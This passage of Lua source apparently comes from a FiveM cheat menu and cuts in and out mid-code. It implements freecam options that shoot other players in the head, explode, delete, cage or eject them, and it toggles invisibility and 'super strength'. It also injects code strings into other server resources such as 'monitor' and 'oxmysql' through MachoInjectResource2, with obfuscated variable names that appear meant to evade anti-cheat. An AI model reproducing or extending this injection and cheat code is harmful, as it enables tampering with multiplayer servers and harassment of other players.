                                                local endY = camPos.y + dirY * 500.0
                                                local endZ = camPos.z + dirZ * 500.0

                                                local ray = StartShapeTestRay(camPos.x, camPos.y, camPos.z, endX, endY, endZ, -1,
                ped, 0)
                                                local _, hitResult, hitCoords, _, hitEntity = GetShapeTestResult(ray)

                                                if currentOpt == "Teleport" and hitResult == 1 then
                                                    local _, groundZ = GetGroundZFor_3dCoord(hitCoords.x, hitCoords.y, hitCoords.z
                + 2.0, false)
                                                    SetEntityCoords(ped, hitCoords.x, hitCoords.y, groundZ and groundZ + 1.0 or
                hitCoords.z, false, false, false, true)

                                                elseif currentOpt == "Delete Entity" and hitEntity and DoesEntityExist(hitEntity)
                then
                                                    SetEntityAsMissionEntity(hitEntity, true, true)
                                                    DeleteEntity(hitEntity)

                                                elseif currentOpt == "Explode" and hitResult == 1 then
                                                    AddOwnedExplosion(ped, hitCoords.x, hitCoords.y, hitCoords.z, 2, 1.0, true,
                false, 1.0)

                                                elseif currentOpt == "Unlock Vehicle" and hitEntity and DoesEntityExist(hitEntity)
                and IsEntityAVehicle(hitEntity) then
                                                    if NetworkHasControlOfEntity(hitEntity) then
                                                        SetEntityAsMissionEntity(hitEntity, true, true)
                                                        SetVehicleHasBeenOwnedByPlayer(hitEntity, true)
                                                        SetVehicleDoorsLocked(hitEntity, 1)
                                                        SetVehicleDoorsLockedForAllPlayers(hitEntity, false)
                                                    end

                                                elseif currentOpt == "Lock Vehicle" and hitEntity and DoesEntityExist(hitEntity)
                and IsEntityAVehicle(hitEntity) then
                                                    if NetworkHasControlOfEntity(hitEntity) then
                                                        SetEntityAsMissionEntity(hitEntity, true, true)
                                                        SetVehicleDoorsLocked(hitEntity, 2)
                                                        SetVehicleDoorsLockedForAllPlayers(hitEntity, true)
                                                    end

                                                elseif currentOpt == "Kick from Vehicle" and hitEntity and
                DoesEntityExist(hitEntity) then
                                                    if IsEntityAPed(hitEntity) then
                                                        local targetCoords = GetEntityCoords(hitEntity)
                                                        SetEntityCoords(ped, targetCoords.x, targetCoords.y, targetCoords.z,
                false, false, false, true)

                                                        if kickFromVehicleEnabled == nil then kickFromVehicleEnabled = false end
                                                        kickFromVehicleEnabled = true

                                                        CreateThread(function()
                                                            while kickFromVehicleEnabled and not Unloaded do
                                                                SetRelationshipBetweenGroups(5, GetHashKey('PLAYER'),
                GetHashKey('PLAYER'))
                                                                Wait(0)
                                                            end
                                                        end)
                                                    end

                                                elseif currentOpt == "Shoot Player" and hitEntity and DoesEntityExist(hitEntity)
                then
                                                    if IsEntityAPed(hitEntity) and hitEntity ~= ped then
                                                        local shooter = PlayerPedId()
                                                        local w = GetHashKey("WEAPON_CARBINERIFLE")

                                                        if not HasPedGotWeapon(shooter, w, false) then
                                                            GiveWeaponToPed(shooter, w, 250, false, false)
                                                        end
                                                        SetCurrentPedWeapon(shooter, w, true)

                                                        local headCoords = GetPedBoneCoords(hitEntity, 31086, 0.0, 0.0, 0.0)
                                                        local shootFrom = vector3(headCoords.x, headCoords.y, headCoords.z + 10.0)

                                                        ShootSingleBulletBetweenCoords(
                                                            shootFrom.x, shootFrom.y, shootFrom.z,
                                                            headCoords.x, headCoords.y, headCoords.z,
                                                            500.0, true, w, shooter, true, false, -1.0
                                                        )
                                                    end

                                                elseif currentOpt == "Cage" and hitResult == 1 then
                                                    local cageModel = GetHashKey("prop_gold_cont_01")
                                                    RequestModel(cageModel)
                                                    local timeout = 0
                                                    while not HasModelLoaded(cageModel) and timeout < 2000 do
                                                        Wait(10)
                                                        timeout = timeout + 10
                                                    end

                                                    if HasModelLoaded(cageModel) then
                                                        local obj = CreateObjectNoOffset(cageModel, hitCoords.x, hitCoords.y,
                hitCoords.z - 1.0, true, true, false)
                                                        FreezeEntityPosition(obj, true)
                                                        PlaceObjectOnGroundProperly(obj)
                                                        SetModelAsNoLongerNeeded(cageModel)
                                                    end

                                                elseif currentOpt == "Shoot Vehicle" then
                                                    local vehModel = GetHashKey(VehicleModels[vehicleIndex])
                                                    RequestModel(vehModel)
                                                    local timeout = 0
                                                    while not HasModelLoaded(vehModel) and timeout < 2000 do
                                                        Wait(10)
                                                        timeout = timeout + 10
                                                    end

                                                    if HasModelLoaded(vehModel) then
                                                        local spawnPos = vector3(camPos.x + dirX * 5.0, camPos.y + dirY * 5.0,
                camPos.z + dirZ * 5.0)
                                                        local veh = CreateVehicle(vehModel, spawnPos.x, spawnPos.y, spawnPos.z,
                0.0, true, false)
                                                        SetVehicleOnGroundProperly(veh)
                                                        SetEntityVelocity(veh, dirX * 150.0, dirY * 150.0, dirZ * 150.0)
                                                        SetModelAsNoLongerNeeded(vehModel)
                                                    end
                                                end
                                            end
                                        end
                                    end

                                    local function CameraControl()
                                        local moveSpeed = 1.0
                                        local fastSpeed = 8.0
                                        local slowSpeed = 0.15
                                        local mouseSens = 7.5

                                        local function ClampAngle(angle, min, max)
                                            return math.max(min, math.min(max, angle))
                                        end

                                        local function RotationToDirection(rotation)
                                            local radiansX = math.rad(rotation.x)
                                            local radiansZ = math.rad(rotation.z)
                                            local cosX = math.cos(radiansX)
                                            return vector3(-math.sin(radiansZ) * cosX, math.cos(radiansZ) * cosX,
                math.sin(radiansX))
                                        end

                                        while isActive do
                                            Wait(0)
                                            local ped = PlayerPedId()

                                            FreezeEntityPosition(ped, true)

                                            local pos = GetCamCoord(camHandle)
                                            local rotRaw = GetCamRot(camHandle, 2)
                                            local rot = {x = rotRaw.x, y = rotRaw.y, z = rotRaw.z}
                                            local forward = RotationToDirection(rot)
                                            local rightVec = vector3(forward.y, -forward.x, 0.0)

                                            local currentSpeed = moveSpeed
                                            if IsDisabledControlPressed(0, 21) then currentSpeed = fastSpeed end
                                            if IsDisabledControlPressed(0, 19) then currentSpeed = slowSpeed end

                                            if IsDisabledControlPressed(0, 32) then pos = pos + forward * currentSpeed end
                                            if IsDisabledControlPressed(0, 33) then pos = pos - forward * currentSpeed end
                                            if IsDisabledControlPressed(0, 34) then pos = pos - rightVec * currentSpeed end
                                            if IsDisabledControlPressed(0, 35) then pos = pos + rightVec * currentSpeed end
                                            if IsDisabledControlPressed(0, 22) then pos = pos + vector3(0, 0, 1.0) * currentSpeed
                end
                                            if IsDisabledControlPressed(0, 36) then pos = pos - vector3(0, 0, 1.0) * currentSpeed
                end

                                            local mouseX = GetControlNormal(0, 1) * mouseSens
                                            local mouseY = GetControlNormal(0, 2) * mouseSens

                                            rot.x = ClampAngle(rot.x - mouseY, -89.0, 89.0)
                                            rot.z = rot.z - mouseX

                                            SetCamCoord(camHandle, pos.x, pos.y, pos.z)
                                            SetCamRot(camHandle, rot.x, rot.y, rot.z, 2)
                                            SetFocusPosAndVel(pos.x, pos.y, pos.z, 0.0, 0.0, 0.0)
                                        end
                                    end

                                    local function Start()
                                        if isActive then return end
                                        isActive = true
                                        local ped = PlayerPedId()

                                        local startPos = GetGameplayCamCoord()
                                        local startRot = GetGameplayCamRot(2)
                                        local startFov = GetGameplayCamFov()

                                        camHandle = CreateCamWithParams("DEFAULT_SCRIPTED_CAMERA", startPos.x, startPos.y,
                startPos.z, startRot.x, startRot.y, startRot.z, startFov, true, 2)

                                        if not DoesCamExist(camHandle) then
                                            isActive = false
                                            return
                                        end

                                        SetCamActive(camHandle, true)
                                        RenderScriptCams(true, false, 0, true, true)
                                        FreezeEntityPosition(ped, true)

                                        CreateThread(RenderUI)
                                        CreateThread(HandleInput)
                                        CreateThread(CameraControl)
                                    end

                                    local function Stop()
                                        if not isActive then return end
                                        isActive = false
                                        local ped = PlayerPedId()

                                        if camHandle and DoesCamExist(camHandle) then
                                            SetCamActive(camHandle, false)
                                            RenderScriptCams(false, false, 0, true, true)
                                            DestroyCam(camHandle, false)
                                        end

                                        Wait(10)
                                        SetFocusEntity(ped)
                                        ClearFocus()
                                        FreezeEntityPosition(ped, false)
                                        camHandle = nil
                                    end

                                    CreateThread(function()
                                        while _G.FreecamActive and not Unloaded do
                                            Wait(0)
                                            if IsDisabledControlJustPressed(0, 74) then
                                                if isActive then
                                                    Stop()
                                                else
                                                    Start()
                                                end
                                            end
                                        end

                                        if isActive then Stop() end
                                    end)
                                ]])
                            else
                                local isActive = false
                                local camHandle = nil
                                local selectedOption = 1
                                local vehicleIndex = 1

                                local VehicleModels = {
                                    "adder", "t20", "zentorno", "dominator3", "blade",
                                    "windsor2", "sentinel2", "serrano", "xls2", "sultan",
                                    "bmx", "vigero", "luxor", "tugboat", "cargoplane"
                                }

                                local Options = {
                                    "Teleport",
                                    "Delete Entity",
                                    "Shoot Vehicle",
                                    "Explode",
                                    "Cage",
                                    "Unlock Vehicle",
                                    "Lock Vehicle",
                                    "Kick from Vehicle",
                                    "Shoot Player"
                                }

                                local function RenderUI()
                                    while isActive do
                                        Wait(0)

                                        SetTextFont(4)
                                        SetTextScale(0.0, 0.4)
                                        SetTextColour(0, 191, 255, 255)
                                        SetTextOutline()
                                        SetTextCentre(true)
                                        BeginTextCommandDisplayText("STRING")
                                        AddTextComponentSubstringPlayerName("+")
                                        EndTextCommandDisplayText(0.5, 0.485)

                                        local baseY = 0.85
                                        local lineSpacing = 0.03
                                        local maxShow = 3

                                        SetTextFont(4)
                                        SetTextScale(0.0, 0.26)
                                        SetTextColour(255, 255, 255, 255)
                                        SetTextCentre(true)
                                        BeginTextCommandDisplayText("STRING")
                                        AddTextComponentSubstringPlayerName(("%d/%d"):format(selectedOption, #Options))
                                        EndTextCommandDisplayText(0.5, baseY - 0.04)

                                        local startIndex = math.max(1, selectedOption - math.floor(maxShow / 2))
                                        local endIndex = math.min(#Options, startIndex + maxShow - 1)

                                        if endIndex == #Options then
                                            startIndex = math.max(1, #Options - maxShow + 1)
                                        end

                                        local displayIdx = 0
                                        for i = startIndex, endIndex do
                                            local yPos = baseY + (displayIdx * lineSpacing)
                                            local isSelected = (i == selectedOption)
                                            local optionText = Options[i]

                                            if optionText == "Shoot Vehicle" then
                                                optionText = optionText .. " (" .. VehicleModels[vehicleIndex]:upper() .. ")"
                                            end

                                            if isSelected then
                                                SetTextFont(4)
                                                SetTextScale(0.0, 0.33)
                                                SetTextColour(0, 191, 255, 255)
                                                SetTextDropShadow(2, 0, 0, 0, 255)
                                            else
                                                SetTextFont(4)
                                                SetTextScale(0.0, 0.28)
                                                SetTextColour(255, 255, 255, 255)
                                            end

                                            SetTextCentre(true)
                                            BeginTextCommandDisplayText("STRING")
                                            AddTextComponentSubstringPlayerName(optionText)
                                            EndTextCommandDisplayText(0.5, yPos)

                                            displayIdx = displayIdx + 1
                                        end
                                    end
                                end

                                local function HandleInput()
                                    while isActive do
                                        Wait(0)
                                        local ped = PlayerPedId()

                                        if IsDisabledControlJustPressed(0, 241) then
                                            selectedOption = selectedOption - 1
                                            if selectedOption < 1 then selectedOption = #Options end
                                        elseif IsDisabledControlJustPressed(0, 242) then
                                            selectedOption = selectedOption + 1
                                            if selectedOption > #Options then selectedOption = 1 end
                                        end

                                        local currentOpt = Options[selectedOption]
                                        if currentOpt == "Shoot Vehicle" then
                                            if IsDisabledControlJustPressed(0, 44) then
                                                vehicleIndex = vehicleIndex - 1
                                                if vehicleIndex < 1 then vehicleIndex = #VehicleModels end
                                            elseif IsDisabledControlJustPressed(0, 38) then
                                                vehicleIndex = vehicleIndex + 1
                                                if vehicleIndex > #VehicleModels then vehicleIndex = 1 end
                                            end
                                        end

                                        if IsDisabledControlJustPressed(0, 24) then
                                            local camPos = GetCamCoord(camHandle)
                                            local camRot = GetCamRot(camHandle, 2)
                                            local heading = math.rad(camRot.z)
                                            local pitch = math.rad(camRot.x)
                                            local cosPitch = math.cos(pitch)
                                            local dirX = -math.sin(heading) * cosPitch
                                            local dirY = math.cos(heading) * cosPitch
                                            local dirZ = math.sin(pitch)

                                            local endX = camPos.x + dirX * 500.0
                                            local endY = camPos.y + dirY * 500.0
                                            local endZ = camPos.z + dirZ * 500.0

                                            local ray = StartShapeTestRay(camPos.x, camPos.y, camPos.z, endX, endY, endZ, -1, ped,
                0)
                                            local _, hitResult, hitCoords, _, hitEntity = GetShapeTestResult(ray)

                                            if currentOpt == "Teleport" and hitResult == 1 then
                                                local _, groundZ = GetGroundZFor_3dCoord(hitCoords.x, hitCoords.y, hitCoords.z +
                2.0, false)
                                                SetEntityCoords(ped, hitCoords.x, hitCoords.y, groundZ and groundZ + 1.0 or
                hitCoords.z, false, false, false, true)

                                            elseif currentOpt == "Delete Entity" and hitEntity and DoesEntityExist(hitEntity) then
                                                SetEntityAsMissionEntity(hitEntity, true, true)
                                                DeleteEntity(hitEntity)

                                            elseif currentOpt == "Explode" and hitResult == 1 then
                                                AddOwnedExplosion(ped, hitCoords.x, hitCoords.y, hitCoords.z, 2, 1.0, true, false,
                1.0)

                                            elseif currentOpt == "Unlock Vehicle" and hitEntity and DoesEntityExist(hitEntity) and
                IsEntityAVehicle(hitEntity) then
                                                if NetworkHasControlOfEntity(hitEntity) then
                                                    SetEntityAsMissionEntity(hitEntity, true, true)
                                                    SetVehicleHasBeenOwnedByPlayer(hitEntity, true)
                                                    SetVehicleDoorsLocked(hitEntity, 1)
                                                    SetVehicleDoorsLockedForAllPlayers(hitEntity, false)
                                                end

                                            elseif currentOpt == "Lock Vehicle" and hitEntity and DoesEntityExist(hitEntity) and
                IsEntityAVehicle(hitEntity) then
                                                if NetworkHasControlOfEntity(hitEntity) then
                                                    SetEntityAsMissionEntity(hitEntity, true, true)
                                                    SetVehicleDoorsLocked(hitEntity, 2)
                                                    SetVehicleDoorsLockedForAllPlayers(hitEntity, true)
                                                end

                                            elseif currentOpt == "Kick from Vehicle" and hitEntity and DoesEntityExist(hitEntity)
                then
                                                if IsEntityAPed(hitEntity) then
                                                    local targetCoords = GetEntityCoords(hitEntity)
                                                    SetEntityCoords(ped, targetCoords.x, targetCoords.y, targetCoords.z, false,
                false, false, true)

                                                    if kickFromVehicleEnabled == nil then kickFromVehicleEnabled = false end
                                                    kickFromVehicleEnabled = true

                                                    CreateThread(function()
                                                        while kickFromVehicleEnabled and not Unloaded do
                                                            SetRelationshipBetweenGroups(5, GetHashKey('PLAYER'),
                GetHashKey('PLAYER'))
                                                            Wait(0)
                                                        end
                                                    end)
                                                end

                                            elseif currentOpt == "Shoot Player" and hitEntity and DoesEntityExist(hitEntity) then
                                                if IsEntityAPed(hitEntity) and hitEntity ~= ped then
                                                    local shooter = PlayerPedId()
                                                    local w = GetHashKey("WEAPON_CARBINERIFLE")

                                                    if not HasPedGotWeapon(shooter, w, false) then
                                                        GiveWeaponToPed(shooter, w, 250, false, false)
                                                    end
                                                    SetCurrentPedWeapon(shooter, w, true)

                                                    local headCoords = GetPedBoneCoords(hitEntity, 31086, 0.0, 0.0, 0.0)
                                                    local shootFrom = vector3(headCoords.x, headCoords.y, headCoords.z + 10.0)

                                                    ShootSingleBulletBetweenCoords(
                                                        shootFrom.x, shootFrom.y, shootFrom.z,
                                                        headCoords.x, headCoords.y, headCoords.z,
                                                        500.0, true, w, shooter, true, false, -1.0
                                                    )
                                                end

                                            elseif currentOpt == "Cage" and hitResult == 1 then
                                                local cageModel = GetHashKey("prop_gold_cont_01")
                                                RequestModel(cageModel)
                                                local timeout = 0
                                                while not HasModelLoaded(cageModel) and timeout < 2000 do
                                                    Wait(10)
                                                    timeout = timeout + 10
                                                end

                                                if HasModelLoaded(cageModel) then
                                                    local obj = CreateObjectNoOffset(cageModel, hitCoords.x, hitCoords.y,
                hitCoords.z - 1.0, true, true, false)
                                                    FreezeEntityPosition(obj, true)
                                                    PlaceObjectOnGroundProperly(obj)
                                                    SetModelAsNoLongerNeeded(cageModel)
                                                end

                                            elseif currentOpt == "Shoot Vehicle" then
                                                local vehModel = GetHashKey(VehicleModels[vehicleIndex])
                                                RequestModel(vehModel)
                                                local timeout = 0
                                                while not HasModelLoaded(vehModel) and timeout < 2000 do
                                                    Wait(10)
                                                    timeout = timeout + 10
                                                end

                                                if HasModelLoaded(vehModel) then
                                                    local spawnPos = vector3(camPos.x + dirX * 5.0, camPos.y + dirY * 5.0,
                camPos.z + dirZ * 5.0)
                                                    local veh = CreateVehicle(vehModel, spawnPos.x, spawnPos.y, spawnPos.z, 0.0,
                true, false)
                                                    SetVehicleOnGroundProperly(veh)
                                                    SetEntityVelocity(veh, dirX * 150.0, dirY * 150.0, dirZ * 150.0)
                                                    SetModelAsNoLongerNeeded(vehModel)
                                                end
                                            end
                                        end
                                    end
                                end

                                local function CameraControl()
                                    local moveSpeed = 1.0
                                    local fastSpeed = 8.0
                                    local slowSpeed = 0.15
                                    local mouseSens = 7.5

                                    local function ClampAngle(angle, min, max)
                                        return math.max(min, math.min(max, angle))
                                    end

                                    local function RotationToDirection(rotation)
                                        local radiansX = math.rad(rotation.x)
                                        local radiansZ = math.rad(rotation.z)
                                        local cosX = math.cos(radiansX)
                                        return vector3(-math.sin(radiansZ) * cosX, math.cos(radiansZ) * cosX, math.sin(radiansX))
                                    end

                                    while isActive do
                                        Wait(0)
                                        local ped = PlayerPedId()

                                        FreezeEntityPosition(ped, true)

                                        local pos = GetCamCoord(camHandle)
                                        local rotRaw = GetCamRot(camHandle, 2)
                                        local rot = {x = rotRaw.x, y = rotRaw.y, z = rotRaw.z}
                                        local forward = RotationToDirection(rot)
                                        local rightVec = vector3(forward.y, -forward.x, 0.0)

                                        local currentSpeed = moveSpeed
                                        if IsDisabledControlPressed(0, 21) then currentSpeed = fastSpeed end
                                        if IsDisabledControlPressed(0, 19) then currentSpeed = slowSpeed end

                                        if IsDisabledControlPressed(0, 32) then pos = pos + forward * currentSpeed end
                                        if IsDisabledControlPressed(0, 33) then pos = pos - forward * currentSpeed end
                                        if IsDisabledControlPressed(0, 34) then pos = pos - rightVec * currentSpeed end
                                        if IsDisabledControlPressed(0, 35) then pos = pos + rightVec * currentSpeed end
                                        if IsDisabledControlPressed(0, 22) then pos = pos + vector3(0, 0, 1.0) * currentSpeed end
                                        if IsDisabledControlPressed(0, 36) then pos = pos - vector3(0, 0, 1.0) * currentSpeed end

                                        local mouseX = GetControlNormal(0, 1) * mouseSens
                                        local mouseY = GetControlNormal(0, 2) * mouseSens

                                        rot.x = ClampAngle(rot.x - mouseY, -89.0, 89.0)
                                        rot.z = rot.z - mouseX

                                        SetCamCoord(camHandle, pos.x, pos.y, pos.z)
                                        SetCamRot(camHandle, rot.x, rot.y, rot.z, 2)
                                        SetFocusPosAndVel(pos.x, pos.y, pos.z, 0.0, 0.0, 0.0)
                                    end
                                end

                                local function Start()
                                    if isActive then return end
                                    isActive = true
                                    local ped = PlayerPedId()

                                    local startPos = GetGameplayCamCoord()
                                    local startRot = GetGameplayCamRot(2)
                                    local startFov = GetGameplayCamFov()

                                    camHandle = CreateCamWithParams("DEFAULT_SCRIPTED_CAMERA", startPos.x, startPos.y, startPos.z,
                startRot.x, startRot.y, startRot.z, startFov, true, 2)

                                    if not DoesCamExist(camHandle) then
                                        isActive = false
                                        return
                                    end

                                    SetCamActive(camHandle, true)
                                    RenderScriptCams(true, false, 0, true, true)
                                    FreezeEntityPosition(ped, true)

                                    CreateThread(RenderUI)
                                    CreateThread(HandleInput)
                                    CreateThread(CameraControl)
                                end

                                local function Stop()
                                    if not isActive then return end
                                    isActive = false
                                    local ped = PlayerPedId()

                                    if camHandle and DoesCamExist(camHandle) then
                                        SetCamActive(camHandle, false)
                                        RenderScriptCams(false, false, 0, true, true)
                                        DestroyCam(camHandle, false)
                                    end

                                    Wait(10)
                                    SetFocusEntity(ped)
                                    ClearFocus()
                                    FreezeEntityPosition(ped, false)
                                    camHandle = nil
                                end

                                CreateThread(function()
                                    while _G.FreecamActive and not Unloaded do
                                        Wait(0)
                                        if IsDisabledControlJustPressed(0, 74) then
                                            if isActive then
                                                Stop()
                                            else
                                                Start()
                                            end
                                        end
                                    end

                                    if isActive then Stop() end
                                end)
                            end
                            sendNotification("Freecam", "Enabled (Press H)", "success", 2000)
                        else
                            _G.FreecamActive = false
                            FreecamActive = false

                            if canInjectResource() then
                                MachoInjectResource2(3, 'monitor', [[
                                    _G.FreecamActive = false
                                ]])
                            else
                            end

                            local ped = PlayerPedId()
                            FreezeEntityPosition(ped, false)
                            sendNotification("Freecam", "Disabled", "info", 2000)
                        end
                    end
                },
                {
                    label = "Invisibility",
                    type = "checkbox",
                    checked = false,
                    onConfirm = function(checked)
                        if checked then
                            if canInjectResource() then
                                local code = [[
                                    local ped = PlayerPedId()
                                    SetEntityVisible(ped, false, false)
                                    SetEntityAlpha(ped, 0, false)
                                    SetPedCanBeTargetted(ped, false)
                                    SetLocalPlayerVisibleLocally(false)
                                    SetEntityLocallyInvisible(ped)
                                    NetworkSetEntityInvisibleToNetwork(ped, true)
                                ]]
                                MachoInjectResource2(3, "any", code)
                                sendNotification("Invisibility", "Enabled", "success", 2000)
                            else
                                local ped = PlayerPedId()
                                SetEntityVisible(ped, false, false)
                                SetEntityAlpha(ped, 0, false)
                                SetPedCanBeTargetted(ped, false)
                                SetLocalPlayerVisibleLocally(false)
                                SetEntityLocallyInvisible(ped)
                                NetworkSetEntityInvisibleToNetwork(ped, true)
                                sendNotification("Invisibility", "Enabled", "success", 2000)
                            end
                        else
                            if canInjectResource() then
                                local code = [[
                                    local ped = PlayerPedId()
                                    SetEntityVisible(ped, true, false)
                                    ResetEntityAlpha(ped)
                                    SetPedCanBeTargetted(ped, true)
                                    SetLocalPlayerVisibleLocally(true)
                                    SetEntityLocallyVisible(ped)
                                    NetworkSetEntityInvisibleToNetwork(ped, false)
                                ]]
                                MachoInjectResource2(3, "any", code)
                            else
                                local ped = PlayerPedId()
                                SetEntityVisible(ped, true, false)
                                ResetEntityAlpha(ped)
                                SetPedCanBeTargetted(ped, true)
                                SetLocalPlayerVisibleLocally(true)
                                SetEntityLocallyVisible(ped)
                                NetworkSetEntityInvisibleToNetwork(ped, false)
                            end
                            sendNotification("Invisibility", "Disabled", "info", 2000)
                        end
                    end
                },
                {
                    label = "Super Strength",
                    type = "checkbox",
                    checked = false,
                    onConfirm = function(checked)
                        if checked then
                            local superStrengthCode = [[
                                if fgawjFmaDjdALaO == nil then fgawjFmaDjdALaO = false end
                                fgawjFmaDjdALaO = true

                                local holdingEntity = false
                                local holdingCarEntity = false
                                local holdingPed = false
                                local heldEntity = nil
                                local entityType = nil

                                CreateThread(function()
                                    while fgawjFmaDjdALaO and not Unloaded do
                                        Wait(0)
                                        if holdingEntity and heldEntity then
                                            local playerPed = PlayerPedId()
                                            local headPos = GetPedBoneCoords(playerPed, 0x796e, 0.0, 0.0, 0.0)
                                            DrawText3Ds(headPos.x, headPos.y, headPos.z + 0.5, "[Y] Drop Entity / [U] Attach Ped")

                                            if holdingCarEntity and not IsEntityPlayingAnim(playerPed, 'anim@mp_rollarcoaster',
                'hands_up_idle_a_player_one', 3) then
                                                RequestAnimDict('anim@mp_rollarcoaster')
                                                while not HasAnimDictLoaded('anim@mp_rollarcoaster') do
                                                    Wait(100)
                                                end
                                                TaskPlayAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one',
                8.0, -8.0, -1, 50, 0, false, false, false)
                                            elseif (holdingPed or not holdingCarEntity) and not IsEntityPlayingAnim(playerPed,
                'anim@heists@box_carry@', 'idle', 3) then
                                                RequestAnimDict('anim@heists@box_carry@')
                                                while not HasAnimDictLoaded('anim@heists@box_carry@') do
                                                    Wait(100)
                                                end
                                                TaskPlayAnim(playerPed, 'anim@heists@box_carry@', 'idle', 8.0, -8.0, -1, 50, 0,
                false, false, false)
                                            end

                                            if not IsEntityAttached(heldEntity) then
                                                holdingEntity = false
                                                holdingCarEntity = false
                                                holdingPed = false
                                                heldEntity = nil
                                            end
                                        end
                                    end
                                end)

                                CreateThread(function()
                                    while fgawjFmaDjdALaO and not Unloaded do
                                        Wait(0)
                                        local playerPed = PlayerPedId()
                                        local camPos = GetGameplayCamCoord()
                                        local camRot = GetGameplayCamRot(2)
                                        local direction = RotationToDirection(camRot)
                                        local dest = vec3(camPos.x + direction.x * 10.0, camPos.y + direction.y * 10.0, camPos.z +
                direction.z * 10.0)

                                        local rayHandle = StartShapeTestRay(camPos.x, camPos.y, camPos.z, dest.x, dest.y, dest.z,
                -1, playerPed, 0)
                                        local _, hit, _, _, entityHit = GetShapeTestResult(rayHandle)
                                        local validTarget = false

                                        if hit == 1 then
                                            entityType = GetEntityType(entityHit)
                                            if entityType == 3 or entityType == 2 or entityType == 1 then
                                                validTarget = true
                                                local headPos = GetPedBoneCoords(playerPed, 0x796e, 0.0, 0.0, 0.0)
                                                DrawText3Ds(headPos.x, headPos.y, headPos.z + 0.5, "[E] Pick Up / [Y] Drop")
                                            end
                                        end

                                        if IsDisabledControlJustReleased(0, 38) then
                                            if validTarget and not holdingEntity then
                                                holdingEntity = true
                                                heldEntity = entityHit

                                                if entityType == 3 then
                                                    AttachEntityToEntity(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309),
                0.0, 0.2, 0.0, 0.0, 0.0, 0.0, true, true, false, true, 1, true)
                                                elseif entityType == 2 then
                                                    holdingCarEntity = true
                                                    AttachEntityToEntity(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309),
                1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                                                elseif entityType == 1 then
                                                    holdingPed = true
                                                    AttachEntityToEntity(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309),
                1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                                                end
                                            end
                                        elseif IsDisabledControlJustReleased(0, 246) then
                                            if holdingEntity then
                                                DetachEntity(heldEntity, true, true)
                                                ApplyForceToEntity(heldEntity, 1, direction.x * 500, direction.y * 500,
                direction.z * 500, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                                                holdingEntity = false
                                                holdingCarEntity = false
                                                holdingPed = false
                                                heldEntity = nil
                                                ClearPedTasks(PlayerPedId())
                                            end
                                        end
                                    end
                                end)

                                function RotationToDirection(rotation)
                                    local adjustedRotation = vec3((math.pi / 180) * rotation.x, (math.pi / 180) * rotation.y,
                (math.pi / 180) * rotation.z)
                                    local direction = vec3(-math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)),
                math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.sin(adjustedRotation.x))
                                    return direction
                                end

                                function DrawText3Ds(x, y, z, text)
                                    local onScreen, _x, _y = World3dToScreen2d(x, y, z)
                                    local px, py, pz = table.unpack(GetGameplayCamCoords())
                                    local scale = (1 / GetDistanceBetweenCoords(px, py, pz, x, y, z, 1)) * 2
                                    local fov = (1 / GetGameplayCamFov()) * 100
                                    scale = scale * fov

                                    if onScreen then
                                        SetTextScale(0.0 * scale, 0.35 * scale)
                                        SetTextFont(0)
                                        SetTextProportional(1)
                                        SetTextColour(255, 255, 255, 215)
                                        SetTextDropshadow(0, 0, 0, 0, 155)
                                        SetTextEdge(2, 0, 0, 0, 150)
                                        SetTextDropShadow()
                                        SetTextOutline()
                                        SetTextEntry("STRING")
                                        SetTextCentre(1)
                                        AddTextComponentString(text)
                                        DrawText(_x, _y)
                                    end
                                end
                            ]]

                            if canInjectResource() then
                                local targetResource = GetResourceState("monitor") == "started" and "monitor" or
                GetResourceState("oxmysql") == "started" and "oxmysql" or GetCurrentResourceName()
                                MachoInjectResource2(3, targetResource, superStrengthCode)
                                sendNotification("Super Strength", "Enabled", "success", 2000)
                            else
                            if fgawjFmaDjdALaO == nil then fgawjFmaDjdALaO = false end
                            fgawjFmaDjdALaO = true

                            local holdingEntity = false
                            local holdingCarEntity = false
                            local holdingPed = false
                            local heldEntity = nil
                            local entityType = nil
                            local awfhjawrasfs = CreateThread

                            awfhjawrasfs(function()
                                while fgawjFmaDjdALaO and not Unloaded do
                                    Wait(0)
                                    if holdingEntity and heldEntity then
                                        local playerPed = PlayerPedId()
                                        local headPos = GetPedBoneCoords(playerPed, 0x796e, 0.0, 0.0, 0.0)
                                        DrawText3Ds(headPos.x, headPos.y, headPos.z + 0.5, "[Y] Drop Entity / [U] Attach Ped")
                                        
                                        if holdingCarEntity and not IsEntityPlayingAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 3) then
                                            RequestAnimDict('anim@mp_rollarcoaster')
                                            while not HasAnimDictLoaded('anim@mp_rollarcoaster') do
                                                Wait(100)
                                            end
                                            TaskPlayAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 8.0, -8.0, -1, 50, 0, false, false, false)
                                        elseif (holdingPed or not holdingCarEntity) and not IsEntityPlayingAnim(playerPed, 'anim@heists@box_carry@', 'idle', 3) then
                                            RequestAnimDict('anim@heists@box_carry@')
                                            while not HasAnimDictLoaded('anim@heists@box_carry@') do
                                                Wait(100)
                                            end
                                            TaskPlayAnim(playerPed, 'anim@heists@box_carry@', 'idle', 8.0, -8.0, -1, 50, 0, false, false, false)
                                        end

                                        if not IsEntityAttached(heldEntity) then
                                            holdingEntity = false
                                            holdingCarEntity = false
                                            holdingPed = false
                                            heldEntity = nil
                                        end
                                    end
                                end
                            end)

                            awfhjawrasfs(function()
                                while fgawjFmaDjdALaO and not Unloaded do
                                    Wait(0)
                                    local playerPed = PlayerPedId()
                                    local camPos = GetGameplayCamCoord()
                                    local camRot = GetGameplayCamRot(2)
                                    local direction = RotationToDirection(camRot)
                                    local dest = vec3(camPos.x + direction.x * 10.0, camPos.y + direction.y * 10.0, camPos.z + direction.z * 10.0)

                                    local rayHandle = StartShapeTestRay(camPos.x, camPos.y, camPos.z, dest.x, dest.y, dest.z, -1, playerPed, 0)
                                    local _, hit, _, _, entityHit = GetShapeTestResult(rayHandle)
                                    local validTarget = false

                                    if hit == 1 then
                                        entityType = GetEntityType(entityHit)
